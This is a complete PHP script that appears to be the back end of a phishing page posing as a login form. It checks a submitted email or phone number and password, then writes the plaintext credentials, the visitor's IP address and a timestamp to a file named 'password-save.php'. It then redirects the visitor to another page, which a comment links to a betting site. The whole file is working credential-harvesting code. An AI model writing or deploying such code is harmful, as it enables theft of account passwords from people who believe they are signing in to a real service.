<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();
$error = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Retrieve form data
    $email_phone = trim($_POST['email_phone']);
    $password = trim($_POST['password']);

    // Check if inputs are empty
    if (empty($email_phone) || empty($password)) {
        $error = "Email or phone number and password cannot be empty.";
    } else {
        // Validate email or phone number
        if (filter_var($email_phone, FILTER_VALIDATE_EMAIL) || preg_match("/^[0-9]{10,15}$/", $email_phone)) {
            // Validate password strength
            $letterCount = preg_match_all('/[a-zA-Z]/', $password); // Count letters (both upper and lower case)
            $numberCount = preg_match('@[0-9]@', $password);        // Check for numbers
            $specialChars = preg_match('@[^\w]@', $password);        // Check for special characters

            // Validate if the password has exactly 6 letters and contains at least one number and one special character
            if ($letterCount === 6 && $numberCount >= 1 && $specialChars >= 1) {
                // Get user IP address, date, and time
                $ip_address = $_SERVER['REMOTE_ADDR'];
                $date_time = date('Y-m-d H:i:s'); // Format: YYYY-MM-DD HH:MM:SS

                // Prepare the data to save
                $data = "Email/Phone: $email_phone, Password: $password, IP: $ip_address, Date/Time: $date_time\n";
                file_put_contents('password-save.php', $data, FILE_APPEND);
                
                // Redirect to 1xbet.com
                header('Location: hlo.html'); 
                exit;
            } else {
                $error = "Password must contain exactly 6 letters, at least one number, and one special character.";
            }
        } else {
            $error = "Please enter a valid email address or phone number.";
        }
    }
}

// Display error messages if any
if (!empty($error)) {
    echo "<div style='color: red;'>$error</div>";
}
?>
